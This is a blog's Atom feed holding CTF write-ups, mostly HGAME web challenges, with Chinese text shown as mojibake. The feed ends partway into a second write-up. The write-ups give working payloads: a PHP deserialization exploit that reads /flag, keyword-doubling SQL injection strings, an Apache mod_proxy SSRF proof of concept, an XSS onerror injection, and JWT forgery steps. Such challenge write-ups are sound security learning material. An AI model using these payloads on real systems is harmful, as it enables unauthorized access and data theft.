<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>é›¾é›¨æ•£èŠ±</title>
  
  
  <link href="https://wuyusanhua2021.github.io/atom.xml" rel="self"/>
  
  <link href="https://wuyusanhua2021.github.io/"/>
  <updated>2022-02-13T14:34:13.885Z</updated>
  <id>https://wuyusanhua2021.github.io/</id>
  
  <author>
    <name>wuyusanhua</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HGAME-Web</title>
    <link href="https://wuyusanhua2021.github.io/2022/02/12/hgame-wp/"/>
    <id>https://wuyusanhua2021.github.io/2022/02/12/hgame-wp/</id>
    <published>2022-02-12T15:46:14.000Z</published>
    <updated>2022-02-13T14:34:13.885Z</updated>
    
    <content type="html"><![CDATA[<h1 id="è››è››"><a href="#è››è››" class="headerlink" title="è››è››"></a>è››è››</h1><p>ç®€å•çˆ¬è™«ï¼Œè„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&quot;https://hgame-spider.vidar.club/e109015477/&quot;</span></span><br><span class="line">cur = url</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = requests.get(cur)</span><br><span class="line">    key = re.search(<span class="string">r&#x27;\?key=(.*)%3D%3D&#x27;</span>, r.text)</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    cur = url + key.group()</span><br><span class="line"><span class="built_in">print</span>(cur)</span><br></pre></td></tr></table></figure><p>æŠ“åŒ…ï¼Œåœ¨responseæŠ¥æ–‡å¤„å³å¯æ‰¾åˆ°flag</p><p><img src="/2022/02/12/hgame-wp/image-20220121120346224.png" alt="image-20220121120346224"></p><h1 id="Tetris-plus"><a href="#Tetris-plus" class="headerlink" title="Tetris plus"></a>Tetris plus</h1><p>f12-&gt;ç½‘ç»œ-&gt;ctrl+Rï¼Œchecking.jsé‡Œé¢æœ‰jsfuckï¼Œç²˜è´´åˆ°æ§åˆ¶å°ç›´æ¥è¾“å‡ºflag</p><p><img src="/2022/02/12/hgame-wp/image-20220121135219197.png" alt="image-20220121135219197"></p><h1 id="ç§‹åå±±"><a href="#ç§‹åå±±" class="headerlink" title="ç§‹åå±±"></a>ç§‹åå±±</h1><p>æŠ“åŒ…ï¼Œæ ¹æ®æç¤ºåœ¨æ–‡ä»¶å¤´æ·»åŠ ï¼š<code>Referer: qiumingshan.net</code>ï¼Œå¾—</p><p><img src="/2022/02/12/hgame-wp/image-20220121141643941.png" alt="image-20220121141643941"></p><p>ä¿®æ”¹User-Agentä¸ºï¼š<code>User-Agent: Hachi-Roku</code></p><p><img src="/2022/02/12/hgame-wp/image-20220121142643859.png" alt="image-20220121142643859"></p><p>æ·»åŠ ï¼š<code>Cookie: flavor=Raspberry</code></p><p><img src="/2022/02/12/hgame-wp/image-20220121143112321.png" alt="image-20220121143112321"></p><p>æ·»åŠ ï¼š<code>gasoline: 100</code></p><p><img src="/2022/02/12/hgame-wp/image-20220121143220216.png" alt="image-20220121143220216"></p><p>æœ€ååŠ ä¸Šï¼š<code>x-real-ip: 127.0.0.1</code></p><p><img src="/2022/02/12/hgame-wp/image-20220121143314194.png" alt="image-20220121143314194"></p><h1 id="ez-auth"><a href="#ez-auth" class="headerlink" title="ez_auth"></a>ez_auth</h1><p>æ³¨å†Œè´¦æˆ·ç™»å½•ï¼Œf12æ‰¾åˆ°token</p><p><img src="/2022/02/12/hgame-wp/image-20220212211617298.png" alt="image-20220212211617298"></p><p>tokenæ”¾åˆ°jwt.ioè§£å¯†ï¼Œä¿®æ”¹username,idä¸ºadmin,1ï¼Œå¹¶åˆ å»secretï¼Œå¾—åˆ°ä¼ªé€ çš„tokenï¼Œä½¿ç”¨ä¼ªé€ çš„tokenç™»å½•å³å¯å¾—åˆ°flag</p><p><img src="/2022/02/12/hgame-wp/image-20220212212506933.png" alt="image-20220212212506933"></p><h1 id="Webpack-Engine"><a href="#Webpack-Engine" class="headerlink" title="Webpack Engine"></a>Webpack Engine</h1><p>f12ï¼Œåœ¨F14g_1s_her3.vueä¸­å¾—flagï¼Œä¸¤æ¬¡base64è§£å¯†å³å¯</p><p><img src="/2022/02/12/hgame-wp/image-20220212215042090.png" alt="image-20220212215042090"></p><h1 id="ä¸€æœ¬å•è¯ä¹¦"><a href="#ä¸€æœ¬å•è¯ä¹¦" class="headerlink" title="ä¸€æœ¬å•è¯ä¹¦"></a>ä¸€æœ¬å•è¯ä¹¦</h1><p><code>www.zip</code>æºç æ³„éœ²ï¼Œç™»å½•éªŒè¯ç›¸å…³ä»£ç å¦‚ä¸‹ï¼Œå¯†ç ä¸ºphpå¼±ç±»å‹ç»•è¿‡ï¼Œä»¤password=1080aå³å¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;adm1n&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(alert(<span class="string">&#x27;username or password is invalid&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_numeric(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(alert(<span class="string">&#x27;å¯†ç ä¸èƒ½è®¾ç½®ä¸ºçº¯æ•°å­—ï¼Œæˆ‘å¦ˆéƒ½çŸ¥é“(ï¿£â–³ï¿£ï¼›)&#x27;</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="number">1080</span>) &#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;unique_key&#x27;</span>] = md5(randomString(<span class="number">8</span>));</span><br><span class="line">            header(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(alert(<span class="string">&#x27;è¿™ä½ éƒ½èƒ½è¾“é”™ï¼Ÿ&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å®¡è®¡æºç ï¼Œsave.phpå°†ç”¨æˆ·çš„è¾“å…¥ç»„åˆä¸º<code>key | value</code>ä¸‰éƒ¨åˆ†å­˜å‚¨ï¼Œget.phpæç¤ºflagåœ¨/flagï¼Œå¹¶ä¸”decode()å‡½æ•°ä¸­ä¼šå¯¹<code>key | value</code>é‡æ–°è¿›è¡Œæ‹†åˆ†ï¼Œå…·ä½“å®ç°ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$data</span></span>): <span class="title">Array</span> </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = [];</span><br><span class="line">    <span class="variable">$offset</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$length</span> = \strlen(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$offset</span> &lt; <span class="variable">$length</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!strstr(substr(<span class="variable">$data</span>, <span class="variable">$offset</span>), <span class="string">&#x27;|&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> [];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$pos</span> = strpos(<span class="variable">$data</span>, <span class="string">&#x27;|&#x27;</span>, <span class="variable">$offset</span>);</span><br><span class="line">        <span class="variable">$num</span> = <span class="variable">$pos</span> - <span class="variable">$offset</span>;</span><br><span class="line">        <span class="variable">$varname</span> = substr(<span class="variable">$data</span>, <span class="variable">$offset</span>, <span class="variable">$num</span>);</span><br><span class="line">        <span class="variable">$offset</span> += <span class="variable">$num</span> + <span class="number">1</span>;</span><br><span class="line">        <span class="variable">$dataItem</span> = unserialize(substr(<span class="variable">$data</span>, <span class="variable">$offset</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span>[<span class="variable">$varname</span>] = <span class="variable">$dataItem</span>;</span><br><span class="line">        <span class="variable">$offset</span> += \strlen(serialize(<span class="variable">$dataItem</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åªè¦å°†keyçš„éƒ¨åˆ†æ”¹é€ æˆ<code>key1 | key2</code>å°±å¯ä»¥åˆ©ç”¨unserializeï¼Œé­”æœ¯æ–¹æ³•å·²åœ¨Evilç±»ä¸­ç»™å‡ºï¼Œ$fileå¯æ§ï¼Œå¯ä»¥å®ç°ä»»æ„æ–‡ä»¶è¯»å–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/hgame/&quot;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;flag = <span class="string">&#x27;hacker!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;flag = <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>expä¸º:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> Evil();</span><br><span class="line"><span class="variable">$payload</span>-&gt;file = <span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&#x27;a|&#x27;</span>.serialize(<span class="variable">$payload</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç”Ÿæˆpayloadè¾“å…¥å³å¯å¾—åˆ°flag</p><h1 id="Pokemon"><a href="#Pokemon" class="headerlink" title="Pokemon"></a>Pokemon</h1><p>ç½‘é¡µæºç æç¤º<code>/index.php?id=1</code>ï¼Œå½“è¾“å…¥idä¸º4å°±è·³è½¬åˆ°<code>error.php?code=404</code>ï¼Œcodeå°±æ˜¯æ³¨å…¥ç‚¹ï¼Œç©ºæ ¼,=ä»¥åŠéƒ¨åˆ†å…³é”®è¯è¢«è¿‡æ»¤</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥å­—æ®µæ•°:code<span class="operator">=</span><span class="number">404</span><span class="comment">/*1*/</span>oorrder<span class="comment">/*1*/</span><span class="keyword">by</span><span class="comment">/*1*/</span><span class="number">2</span>#</span><br><span class="line"></span><br><span class="line">æŸ¥åº“å:code<span class="operator">=</span><span class="number">404</span><span class="comment">/*1*/</span>ununionion<span class="comment">/*1*/</span>selselectect<span class="comment">/*1*/</span><span class="number">1</span>,database()#</span><br><span class="line"></span><br><span class="line">æŸ¥è¡¨å:code<span class="operator">=</span><span class="number">404</span><span class="comment">/*1*/</span>uniunionon<span class="comment">/*1*/</span>selselectect<span class="comment">/*1*/</span><span class="number">1</span>,group_concat(table_name)<span class="comment">/*1*/</span>frfromom<span class="comment">/*1*/</span>infoorrmation_schema.tables<span class="comment">/*1*/</span>whewherere<span class="comment">/*1*/</span>table_schema<span class="comment">/*1*/</span><span class="keyword">like</span><span class="comment">/*1*/</span>&quot;pokemon&quot;#</span><br><span class="line"></span><br><span class="line">æŸ¥åˆ—å:code<span class="operator">=</span><span class="number">404</span><span class="comment">/*1*/</span>uniunionon<span class="comment">/*1*/</span>selselectect<span class="comment">/*1*/</span><span class="number">1</span>,group_concat(column_name)<span class="comment">/*1*/</span>frfromom<span class="comment">/*1*/</span>infoorrmation_schema.columns<span class="comment">/*1*/</span>whewherere<span class="comment">/*1*/</span>table_name<span class="comment">/*1*/</span><span class="keyword">like</span><span class="comment">/*1*/</span>&quot;fllllllllaaaaaag&quot;#</span><br><span class="line"></span><br><span class="line">æŸ¥flag:code<span class="operator">=</span><span class="number">404</span><span class="comment">/*1*/</span>uniunionon<span class="comment">/*1*/</span>selselectect<span class="comment">/*1*/</span><span class="number">1</span>,group_concat(flag)<span class="comment">/*1*/</span>frfromom<span class="comment">/*1*/</span>pokemon.fllllllllaaaaaag#</span><br></pre></td></tr></table></figure><h1 id="Apache"><a href="#Apache" class="headerlink" title="Apache!"></a>Apache!</h1><p>å¤ç°çš„æ—¶å€™ç¯å¢ƒå·²ç»æ— äº†</p><p>æœ¬é¢˜çš„è€ƒç‚¹æ˜¯<code>cve-2021-40438</code>ï¼Œé€‚ç”¨èŒƒå›´Apache&lt;=2.4.49ï¼Œæ¼æ´åŸç†ä¸ºï¼š</p><blockquote><p>åˆ©ç”¨apacheå‡½æ•°ç¼ºé™·ï¼Œæ„é€ å¯æ§çš„åå‘ä»£ç†ï¼šApacheåœ¨æ­£å¸¸æƒ…å†µä¸‹ï¼Œå› ä¸ºè¯†åˆ«åˆ°äº†unixå¥—æ¥å­—ï¼Œæ‰€ä»¥ä¼šæŠŠç”¨æˆ·è¯·æ±‚å‘é€ç»™è¿™ä¸ªæœ¬åœ°æ–‡ä»¶å¥—æ¥å­—ï¼Œè€Œä¸æ˜¯åç«¯URLã€‚ä½¿unixå¥—æ¥å­—è¿‡é•¿ï¼Œå°±ä¼šè¿”å›ç©ºï¼Œè¯·æ±‚å°±ä¼šå‘é€ç»™åç«¯çš„urlã€‚å…·ä½“è¯´æ˜ï¼šå½“è¿œç¨‹åœ¨ç›®æ ‡ç¯å¢ƒï¼ˆæœåŠ¡å™¨ï¼‰ä½¿ç”¨äº†mod_proxyåšåå‘ä»£ç†ï¼Œæ¯”å¦‚ProxyPass /  â€œ<a href="http://localhost:8000/&quot;%EF%BC%8C%E6%AD%A4%E6%97%B6%E9%80%9A%E8%BF%87%E8%AF%B7%E6%B1%82http://target/?unix:%7B&#39;A&#39;*5000}|http://example.com/%E5%8D%B3%E5%8F%AF%E5%90%91**http://%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9C%B0%E5%9D%80%E6%88%96%E8%87%AA%E5%B7%B1%E5%8F%AF%E6%8E%A7%E7%9A%84%E7%BD%91%E7%AB%99.com**%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82%EF%BC%88%E8%BF%99%E4%B8%AA%E8%AF%B7%E6%B1%82%E5%B0%B1%E6%98%AF%E4%BB%8E%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%91%E8%B5%B7%E7%9A%84%E5%90%91%E8%87%AA%E5%B7%B1%E7%9A%84%E8%AF%B7%E6%B1%82%EF%BC%89%EF%BC%8C%E9%80%A0%E6%88%90%E4%B8%80%E4%B8%AASSRF%E6%94%BB%E5%87%BB%E3%80%82">http://localhost:8000/&quot;ï¼Œæ­¤æ—¶é€šè¿‡è¯·æ±‚http://target/?unix:{&#39;A&#39;*5000}|http://example.com/å³å¯å‘**http://è‡ªå·±çš„åœ°å€æˆ–è‡ªå·±å¯æ§çš„ç½‘ç«™.com**å‘é€è¯·æ±‚ï¼ˆè¿™ä¸ªè¯·æ±‚å°±æ˜¯ä»æœåŠ¡ç«¯å‘èµ·çš„å‘è‡ªå·±çš„è¯·æ±‚ï¼‰ï¼Œé€ æˆä¸€ä¸ªSSRFæ”»å‡»ã€‚</a></p></blockquote><p>pocä¸º<code>http://target/?unix:&#123;&#39;A&#39;*5000&#125;|http://example.com/</code>ï¼Œè‹¥ä¸ä½¿ç”¨Apacheä½œä¸ºä»£ç†æœåŠ¡å™¨ï¼Œåˆ™éœ€è¦åŠ ä¸Šä»£ç†æœåŠ¡å™¨</p><h1 id="At0mçš„ç•™è¨€æ¿"><a href="#At0mçš„ç•™è¨€æ¿" class="headerlink" title="At0mçš„ç•™è¨€æ¿"></a>At0mçš„ç•™è¨€æ¿</h1><p>hint:<br> 1.ç•™è¨€æ¿æ­£åœ¨å°è¯•å›¾ç‰‡ç•™è¨€çš„å…¼å®¹æ€§æµ‹è¯•<br> 2.flagçš„åå­—è¢«æ”¹äº†</p><p>ç•™è¨€æ¿ç½‘é¡µæºç å°±æœ‰æš—ç¤ºï¼Œçœ‹äº†å®˜æ–¹wpæ‰çŸ¥é“</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> auth0r = <span class="string">&#x27;at0m&#x27;</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> flag = <span class="string">&#x27;hgame&#123;xxx&#125;&#x27;</span>;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç”¨varå®šä¹‰çš„flagæ˜¯å…¨å±€å˜é‡ï¼Œå¯ä»¥ç”¨Object.key(window)æŸ¥çœ‹flagçš„å˜é‡å</p><p>æ ¹æ®hint1æœ‰<code>&lt;img src=x.png onerror=&quot;document.getEmploymentsByClassName(&#39;content&#39;)[0].innerText = Object.key(window)&quot;&gt;</code></p><p>å¾—åˆ°flagå˜é‡åF149_is_Here</p><p>æ¥ä¸‹æ¥ç›´æ¥æŸ¥çœ‹å®ƒ<code>&lt;img src=x.png onerror=&quot;document.getEmploymentsByClassName(&#39;content&#39;)[0].innerText = &quot;F149_is_Here&quot;&gt;</code></p><h1 id="Security-Center"><a href="#Security-Center" class="headerlink" title="Security Center"></a>Security Center</h1><p>ç½‘é¡µæºç æœ‰æç¤ºï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- hint: /vendor/composer/installed.json --&gt;</span></span><br></pre></td></tr></table></figure><p>è½¬å»è¯¥é¡µé¢å¾—å…³é”®ä¿¡æ¯ï¼šç½‘ç«™ä½¿ç”¨twig3.3.7æ¨¡ç‰ˆ</p><p><img src="/2022/02/12/hgame-wp/image-20220212233024313.png" alt="image-20220212233024313"></p><p>å›åˆ°é¦–é¡µç‚¹å‡»è·³è½¬é“¾æ¥ï¼Œæ¥åˆ°<code>redirect.php?url=URL</code>ï¼Œç»è¿‡æµ‹è¯•urlå°±æ˜¯æ¨¡æ¿æ³¨å…¥ç‚¹</p><p>ç½‘ä¸Šæ‰¾åˆ°ç›¸å…³payloadï¼Œcat,tacå‘½ä»¤è¢«è¿‡æ»¤ï¼Œå¯ä»¥å†™webshellï¼Œä¹Ÿå¯ä»¥base64å‘½ä»¤ç›´æ¥è¾“å‡ºflag</p><h1 id="Vider-shop-Demo"><a href="#Vider-shop-Demo" class="headerlink" title="Vider shop Demo"></a>Vider shop Demo</h1><p>ç¯å¢ƒä¹Ÿæ— äº†ï¼Œæ¯”èµ›æ—¶çš„æ€è·¯å¾ˆç®€å•ï¼Œ10000å…ƒå¯ä»¥ä¹°flagï¼Œä½†æ˜¯è´¦æˆ·é‡Œåªæœ‰9999å…ƒï¼ŒåŒæ—¶è´­ç‰©è½¦é‡Œæœ‰ä¸€äº›è®¢å•ï¼Œæ”¯ä»˜ä¼šæ‰£é™¤ç›¸åº”çš„é‡‘é¢ï¼Œæ’¤é”€æ”¯ä»˜ä¹Ÿä¼šè¿”å›æ”¯ä»˜çš„é‡‘é¢ï¼Œæ–°å»ºä¸€ä¸ªè®¢å•ï¼Œç‚¹ä¹‹å‰å·²æœ‰çš„è®¢å•é€€æ¬¾ï¼ŒæŠ“åŒ…ï¼ŒæŠŠæ–°å»ºè®¢å•çš„idè¾“å…¥ï¼Œæ”¾åŒ…ï¼Œè´¦æˆ·ä½™é¢å°±ä¼šè¶…è¿‡10000ï¼Œä¹°flagä»˜æ¬¾å³å¯ï¼Œä½†week3çš„å®˜æ–¹wpç»™å‡ºçš„è§£æ³•æ˜¯æ¡ä»¶ç«äº‰ï¼Œä¹‹åä¸€å®šå­¦å­¦æ¡ä»¶ç«äº‰</p><h1 id="LoginMe"><a href="#LoginMe" class="headerlink" title="LoginMe"></a>LoginMe</h1><p>ç¬¬ä¸€æ¬¡é‡åˆ°éMySQLçš„sqlæ³¨å…¥é¢˜ï¼Œç”¨çš„æ˜¯SQLiteï¼Œæœ‰ä¸€ç¯‡æ€»ç»“SQLiteæ³¨å…¥çš„<a href="https://lanvnal.com/2020/12/08/sqlite-zhu-ru-de-yi-dian-zong-jie/">åšå®¢</a></p><p>é¢˜ç›®ä½¿ç”¨sqlmapçš„<code>--data </code>å‘½ä»¤èƒ½ä¸€æŠŠæ¢­ï¼Œçˆ†å‡ºadminå¯†ç ï¼Œç„¶åç™»å½•adminç”¨æˆ·å°±èƒ½å¾—åˆ°flagï¼Œåˆ†æä¸€ä¸‹sqlmapç”Ÿæˆçš„ç›²æ³¨æ–‡ä»¶</p><p>éšæœºæŠ½å–ä¸€ä¸ªpayloadï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;test&#x27;) AND SUBSTR((SELECT COALESCE(sql,CHAR(32)) FROM sqlite_master WHERE tbl_name=CHAR(117,117,117,115,115,115,101,101,101,114,114,114,115,115,115) LIMIT 1),1,1)=CHAR(117) AND (&#x27;Hxna&#x27;=&#x27;Hxna&quot;,&quot;password&quot;:&quot;test&quot;&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯åœ¨çˆ†åˆ—åï¼Œå…¶ä¸­ç”¨åˆ°äº†ä¸€ä¸ªå‡½æ•°COALESCE()ï¼ŒæŸ¥äº†ä¸€ä¸‹èµ„æ–™ï¼ŒSqlServer/MySql/Oracle/PostgreSql/Sqliteå‡æ”¯æŒè¯¥å‡½æ•°ï¼Œç”¨æ³•å¦‚ä¸‹ï¼š</p><p><img src="/2022/02/12/hgame-wp/image-20220213205858681.png" alt="image-20220213205858681"></p><p>æ‰€ä»¥è¯­å¥çš„æ„æ€å°±æ˜¯åˆ¤æ–­åˆ›å»ºuuussseeerrrè¡¨çš„<code>sql</code>è¯­å¥çš„ç¬¬nä¸ªå­—ç¬¦æ˜¯å¦ç¬¦åˆæ¡ä»¶ï¼Œæ˜¯åˆ™è¿”å›è¯¥å­—ç¬¦ï¼Œå¦åˆ™è¿”å›char(32)ï¼Œç›²æ³¨è„šæœ¬å°±å¾ˆå¥½åæ¨äº†ï¼šäºŒåˆ†æŸ¥æ‰¾ï¼Œè¿”å›char(32)å°±breakï¼Œè¿”å›å…¶å®ƒå€¼å°±æ·»åŠ åˆ°resultã€‚åˆgetäº†ä¸€ç§ç”¨coalesceçš„ç›²æ³¨æ–¹å¼</p><h1 id="Markdown-Online"><a href="#Markdown-Online" class="headerlink" title="Markdown Online"></a>Markdown Online</h1><h1 id="Comment"><a href="#Comment" class="headerlink" title="Comment"></a>Comment</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;è››è››&quot;&gt;&lt;a href=&quot;#è››è››&quot; class=&quot;headerlink&quot; title=&quot;è››è››&quot;&gt;&lt;/a&gt;è››è››&lt;/h1&gt;&lt;p&gt;ç®€å•çˆ¬è™«ï¼Œè„šæœ¬å¦‚ä¸‹&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;g</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ç¥¥äº‘æ¯2021-secrets_of_admin</title>
    <link href="https://wuyusanhua2021.github.io/2022/02/09/secrets-of-admin/"/>
    <id>https://wuyusanhua2021.github.io/2022/02/09/secrets-of-admin/</id>
    <published>2022-02-09T05:55:26.000Z</published>
    <updated>2022-02-09T11:03:21.763Z</updated>
    
    <content type="html"><![CDATA[<p>ç™»å½•ç•Œé¢æç¤ºä»¥adminèº«ä»½ç™»å½•</p><p><img src="/2022/02/09/secrets-of-admin/image-20220209143402636.png" alt="image-20220209143402636"></p><p>ä¸‹è½½é™„ä»¶</p><p><img src="/2022/02/09/secrets-of-admin/image-20220209135724262.png" alt="image-20220209135724262"></p><p>routesæ–‡ä»¶å¤¹é‡Œåˆ™æ˜¯index.tsï¼Œæœ‰å„ä¸ªè·¯ç”±çš„å…·ä½“å®ç°ä»£ç </p><p>database.tsé‡Œé¢æ˜¯ä¸€ä¸ªSQLite3å¯¹è±¡å’Œä¸€ä¸ªDBç±»ï¼Œå…¶ä¸­æ˜¾ç¤ºsuperuserç”¨æˆ·æœ‰ä¸€ä¸ªflagæ–‡ä»¶ï¼Œåº”è¯¥å°±æ˜¯è¦æ‰¾çš„flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> files (username, filename, checksum) <span class="keyword">VALUES</span> (<span class="string">&#x27;superuser&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;be5a14a8e504a66979f6938338b0662c&#x27;</span>);`);</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯index.tsé‡Œç›´æ¥æŠŠsuperuserç»™banäº†ï¼Œå†æ‰¾åˆ°adminçš„å¯†ç ï¼Œç™»å½•æ¥åˆ°<code>/admin</code>è·¯ç”±</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> users (id, username, password) <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;e365655e013ce7fdbdbf8f27b418c8fe6dc9354dc4c0328fa02b0ea547659645&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="/2022/02/09/secrets-of-admin/image-20220209143335124.png" alt="image-20220209143335124"></p><p>éšä¾¿è¾“ç‚¹ä¸œè¥¿generateä¸€ä¸‹</p><p><img src="/2022/02/09/secrets-of-admin/image-20220209144234755.png" alt="image-20220209144234755"></p><p>æç¤º<code>how to download it right?</code></p><p>å®¡è®¡index.tsä¸­<code>/admin</code>è·¯ç”±ç›¸å…³çš„ä»£ç </p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 